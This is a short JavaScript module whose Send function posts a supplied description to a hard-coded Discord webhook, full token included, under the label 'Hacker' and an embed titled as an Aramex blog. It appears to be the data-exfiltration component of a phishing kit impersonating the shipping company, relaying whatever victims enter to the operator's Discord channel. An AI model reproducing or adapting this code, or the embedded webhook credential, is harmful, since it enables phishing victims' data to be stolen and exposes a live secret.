import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1327020415314559077/wFMARvjEqb8xfcvHC9mcHWa4_VV0zIJncaufplbNHsjXSz4W-QjT0Gk5d9FF0xI3_mAp",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
